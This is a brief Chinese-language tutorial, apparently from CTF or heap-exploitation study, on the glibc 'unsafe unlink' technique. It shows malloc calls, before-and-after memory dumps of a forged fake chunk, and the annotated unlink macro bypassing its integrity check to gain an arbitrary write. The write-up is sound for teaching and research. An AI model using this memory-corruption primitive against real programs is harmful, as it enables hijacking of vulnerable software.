申请的chunk：

```
malloc(0,0x30)
malloc(1,0xf0)
malloc(2,0x100)
malloc(3,0x100)
```

原始数据：

```text
0x130f000	00 00 00 00   00 00 00 00   41 00 00 00   00 00 00 00
0x130f010	00 00 00 00   00 00 00 00   00 00 00 00   00 00 00 00
.........
0x130f040	00 00 00 00   00 00 00 00   01 01 00 00   00 00 00 00
0x130f050	00 00 00 00   00 00 00 00   00 00 00 00   00 00 00 00
.........
0x130f140	00 00 00 00   00 00 00 00   11 01 00 00   00 00 00 00
0x130f150	00 00 00 00   00 00 00 00   00 00 00 00   00 00 00 00
```

伪造fake_chunk后：

```plaintext
0x130f000	00 00 00 00   00 00 00 00   41 00 00 00   00 00 00 00
0x130f010	00 00 00 00   00 00 00 00   31 00 00 00   00 00 00 00
0x130f020	e8 22 60 00   00 00 00 00   f0 22 60 00   00 00 00 00
0x130f030	00 00 00 00   00 00 00 00   00 00 00 00   00 00 00 00
0x130f040	30 00 00 00   00 00 00 00   00 01 00 00   00 00 00 00
0x130f050	00 00 00 00   00 00 00 00   00 00 00 00   00 00 00 00
.........
0x130f140	00 00 00 00   00 00 00 00   11 01 00 00   00 00 00 00
0x130f150	00 00 00 00   00 00 00 00   00 00 00 00   00 00 00 00
```

free chunk1:

```c
define unlink(P, BK, FD) {   
    // P = chunk1 = 0x130f010
    FD = P->fd;   // FD = 0x6022e8 ,FD为P的前驱
    BK = P->bk;   // BK = 0x6022f0 ,BK为P的后继
    if (__builtin_expect (FD->bk != P || BK->fd != P, 0))	//判断P的前驱的bk是否为P，以及判断P的后继的fd是否为P
//FD->bk = *(0x6022e8+0x18) = 0x130f010 == P
//BK->fd = *(0x6022f0+0x10) = 0x130f010	== P
    	malloc_printerr (check_action, "corrupted double-linked list", P, AV);
    FD->bk = BK;   // &(0x6022e8 + 0x18) = &0x602300 = 0x6022f0 
    BK->fd = FD;   // &(0x6022f0 + 0x10) = &0x602300 = 0x6022e8 
    ... // ...是判断是否加入smallbin和largebin的代码
}
```

绕过了检测，脱链时，P的前驱的bk指针指向P的后继，P的后继的fd指针指向P的前驱：

```c
FD->bk = BK;   // &(0x6022e8 + 0x18) = &0x602300 = 0x6022f0
BK->fd = FD;   // &(0x6022f0 + 0x10) = &0x602300 = 0x6022e8
```

最终0x602300所在地址处被赋值为0x6022e8，此时再编辑chunk0，就可以编辑栈上的地址
